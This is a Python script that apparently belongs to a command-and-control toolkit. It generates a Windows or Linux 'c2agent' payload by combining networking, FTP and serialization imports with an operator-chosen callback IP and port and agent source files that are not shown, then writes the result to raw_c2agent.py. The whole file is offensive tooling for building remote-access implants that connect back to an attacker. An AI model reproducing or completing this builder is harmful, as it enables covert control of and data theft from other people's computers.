from os import system
import os
from pwn import log
from subprocess import getoutput
import sys

LIBS = '''
import paramiko
import socket
import shlex
import os
import subprocess
import getpass
import threading
import struct
import pickle
import zlib
import base64
import sys
import code
import binascii
import traceback
import time
import random
import re
import select
import ctypes
from time import sleep
from ftplib import FTP_TLS
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import logging
import platform

'''

def generate_payload(arch, ip, port):
	
	sources_folder = f"{os.path.realpath(os.path.dirname(sys.argv[0]))}/agent_sources"
	FILE = []

	if arch == 'windows':
		print('[*] arch: windows')
		f = open(f'{sources_folder}/windows_src.py', 'r').readlines()
		l = [line.strip('\n') for line in f]
	if arch == 'linux':
		print('[*] arch: linux')
		f = open(f'{sources_folder}/linux_src.py', 'r').readlines()
		l = [line.strip('\n') for line in f]	
	print(f'[*] using callback IP: {ip}')
	print(f'[*] using callback port: {port}')
	FILE.append(LIBS)
	FILE.append('\n\n')
	FILE.append(f"IP = '{ip}'")
	FILE.append(f"PORT = {port}")
	FILE.append('\n')
	for line in l:
		FILE.append(line)	


	final_payload = '\n'.join(FILE)
	filename = 'raw_c2agent.py'
	open(filename, 'w').write(final_payload)
	print(f'[*] payload written in ({filename})')
